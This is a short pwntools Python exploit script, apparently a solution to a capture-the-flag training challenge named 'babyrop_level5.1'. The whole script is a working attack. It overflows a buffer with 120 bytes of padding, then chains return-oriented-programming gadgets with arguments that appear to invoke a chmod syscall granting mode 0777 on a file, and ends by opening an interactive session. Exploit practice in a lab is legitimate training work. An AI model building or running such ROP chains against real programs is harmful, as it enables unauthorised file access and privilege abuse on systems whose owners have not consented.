from pwn import *
offset = 120
context.terminal = ['tmux','splitw','-h']
context.arch = "amd64"
context.binary = '/challenge/babyrop_level5.1'
p = process()
gdb.attach(p)
payload = b'A'*120
payload += p64(0x0000000000401349) + p64(0x5a)
payload += p64(0x0000000000401338) + p64(0x00402004)
payload += p64(0x0000000000401360) + p64(511)
payload += p64(0x0000000000401340)
p.send(payload)
p.interactive()